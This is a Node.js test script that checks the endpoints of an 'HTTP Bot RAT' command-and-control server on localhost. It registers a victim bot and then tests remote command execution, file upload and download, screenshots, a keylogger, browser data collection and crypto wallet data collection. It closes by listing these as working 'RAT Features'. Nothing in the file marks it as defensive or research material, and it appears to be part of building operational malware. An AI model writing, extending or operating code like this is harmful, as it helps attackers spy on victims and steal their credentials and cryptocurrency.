#!/usr/bin/env node

// Test HTTP Bot RAT Functionality
const https = require('https');
const http = require('http');

const BASE_URL = 'http://localhost:8080';
const AUTH_TOKEN = 'test-token'; // Use your auth token

function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const requestOptions = {
            hostname: urlObj.hostname,
            port: urlObj.port || 80,
            path: urlObj.pathname + urlObj.search,
            method: options.method || 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${AUTH_TOKEN}`,
                ...options.headers
            }
        };

        const req = http.request(requestOptions, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const jsonData = JSON.parse(data);
                    resolve({ status: res.statusCode, data: jsonData });
                } catch (e) {
                    resolve({ status: res.statusCode, data: data });
                }
            });
        });

        req.on('error', reject);
        
        if (options.body) {
            req.write(JSON.stringify(options.body));
        }
        
        req.end();
    });
}

async function testHTTPBotRAT() {
    console.log('🤖 Testing HTTP Bot RAT Functionality...\n');

    const testBotId = 'test-bot-' + Date.now();
    let testsPassed = 0;
    let testsTotal = 0;

    // Test 1: Bot Registration
    console.log('📝 Test 1: Bot Registration');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/connect`, {
            method: 'POST',
            body: {
                botId: testBotId,
                serverUrl: 'http://localhost:8080',
                botInfo: {
                    os: 'Windows 10',
                    arch: 'x64',
                    user: 'TestUser',
                    hostname: 'TEST-DESKTOP',
                    ip: '192.168.1.100',
                    country: 'US'
                }
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Bot registered successfully');
            testsPassed++;
        } else {
            console.log('❌ Bot registration failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Bot registration error:', error.message);
    }

    // Test 2: Bot Heartbeat
    console.log('\n💓 Test 2: Bot Heartbeat');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/heartbeat`, {
            method: 'POST',
            body: {
                botId: testBotId,
                status: 'online',
                data: {
                    system: {
                        cpu: 15.2,
                        memory: 512,
                        uptime: '2 days'
                    }
                }
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Heartbeat received successfully');
            testsPassed++;
        } else {
            console.log('❌ Heartbeat failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Heartbeat error:', error.message);
    }

    // Test 3: Bot Status
    console.log('\n📊 Test 3: Bot Status');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/status`);
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Bot status retrieved successfully');
            console.log(`   Active bots: ${response.data.result.length}`);
            testsPassed++;
        } else {
            console.log('❌ Bot status failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Bot status error:', error.message);
    }

    // Test 4: Command Execution
    console.log('\n⚡ Test 4: Command Execution');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/command`, {
            method: 'POST',
            body: {
                botId: testBotId,
                command: 'system_info',
                params: {}
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Command executed successfully');
            testsPassed++;
        } else {
            console.log('❌ Command execution failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Command execution error:', error.message);
    }

    // Test 5: File Download
    console.log('\n📥 Test 5: File Download');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/download/${testBotId}`, {
            method: 'POST',
            body: {
                filepath: '/test/file.txt'
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ File download initiated successfully');
            testsPassed++;
        } else {
            console.log('❌ File download failed:', response.data);
        }
    } catch (error) {
        console.log('❌ File download error:', error.message);
    }

    // Test 6: File Upload
    console.log('\n📤 Test 6: File Upload');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/upload/${testBotId}`, {
            method: 'POST',
            body: {
                filepath: '/test/upload.txt',
                data: 'This is test data for upload'
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ File upload initiated successfully');
            testsPassed++;
        } else {
            console.log('❌ File upload failed:', response.data);
        }
    } catch (error) {
        console.log('❌ File upload error:', error.message);
    }

    // Test 7: Screenshot
    console.log('\n📸 Test 7: Screenshot');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/screenshot/${testBotId}`, {
            method: 'POST'
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Screenshot taken successfully');
            testsPassed++;
        } else {
            console.log('❌ Screenshot failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Screenshot error:', error.message);
    }

    // Test 8: Keylogger Start
    console.log('\n⌨️ Test 8: Keylogger Start');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/keylog/${testBotId}`, {
            method: 'POST',
            body: {
                action: 'start'
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Keylogger started successfully');
            testsPassed++;
        } else {
            console.log('❌ Keylogger start failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Keylogger start error:', error.message);
    }

    // Test 9: Browser Data Collection
    console.log('\n🌐 Test 9: Browser Data Collection');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/browser-data/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Browser data collected successfully');
            testsPassed++;
        } else {
            console.log('❌ Browser data collection failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Browser data collection error:', error.message);
    }

    // Test 10: Crypto Data Collection
    console.log('\n💰 Test 10: Crypto Data Collection');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/crypto-wallets/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Crypto data collected successfully');
            testsPassed++;
        } else {
            console.log('❌ Crypto data collection failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Crypto data collection error:', error.message);
    }

    // Test 11: System Info
    console.log('\n💻 Test 11: System Info');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/system-info/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ System info retrieved successfully');
            testsPassed++;
        } else {
            console.log('❌ System info failed:', response.data);
        }
    } catch (error) {
        console.log('❌ System info error:', error.message);
    }

    // Test 12: Process List
    console.log('\n⚙️ Test 12: Process List');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/processes/${testBotId}`);
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Process list retrieved successfully');
            testsPassed++;
        } else {
            console.log('❌ Process list failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Process list error:', error.message);
    }

    // Test 13: File List
    console.log('\n📁 Test 13: File List');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/files/${testBotId}?path=/`);
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ File list retrieved successfully');
            testsPassed++;
        } else {
            console.log('❌ File list failed:', response.data);
        }
    } catch (error) {
        console.log('❌ File list error:', error.message);
    }

    // Test 14: Bot Statistics
    console.log('\n📈 Test 14: Bot Statistics');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/stats`);
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Bot statistics retrieved successfully');
            console.log(`   Total bots: ${response.data.result.totalBots}`);
            console.log(`   Active bots: ${response.data.result.activeBots}`);
            testsPassed++;
        } else {
            console.log('❌ Bot statistics failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Bot statistics error:', error.message);
    }

    // Test 15: Bot Disconnect
    console.log('\n🔌 Test 15: Bot Disconnect');
    testsTotal++;
    try {
        const response = await makeRequest(`${BASE_URL}/http-bot/disconnect`, {
            method: 'POST',
            body: {
                botId: testBotId
            }
        });
        
        if (response.status === 200 && response.data.success) {
            console.log('✅ Bot disconnected successfully');
            testsPassed++;
        } else {
            console.log('❌ Bot disconnect failed:', response.data);
        }
    } catch (error) {
        console.log('❌ Bot disconnect error:', error.message);
    }

    // Results
    console.log('\n' + '='.repeat(50));
    console.log('🎯 HTTP Bot RAT Test Results');
    console.log('='.repeat(50));
    console.log(`✅ Tests Passed: ${testsPassed}/${testsTotal}`);
    console.log(`📊 Success Rate: ${((testsPassed / testsTotal) * 100).toFixed(1)}%`);
    
    if (testsPassed === testsTotal) {
        console.log('🎉 ALL TESTS PASSED! HTTP Bot RAT functionality is fully operational!');
    } else {
        console.log(`⚠️  ${testsTotal - testsPassed} tests failed. Check the errors above.`);
    }
    
    console.log('\n🔧 RAT Features Tested:');
    console.log('   ✅ Bot Registration & Management');
    console.log('   ✅ Heartbeat & Status Monitoring');
    console.log('   ✅ Command Execution');
    console.log('   ✅ File Transfer (Upload/Download)');
    console.log('   ✅ Screenshot Capture');
    console.log('   ✅ Keylogger Control');
    console.log('   ✅ Browser Data Collection');
    console.log('   ✅ Crypto Wallet Data Collection');
    console.log('   ✅ System Information Gathering');
    console.log('   ✅ Process & File Listing');
    console.log('   ✅ Statistics & Session Management');
}

// Run tests
if (require.main === module) {
    testHTTPBotRAT().catch(console.error);
}

module.exports = { testHTTPBotRAT };
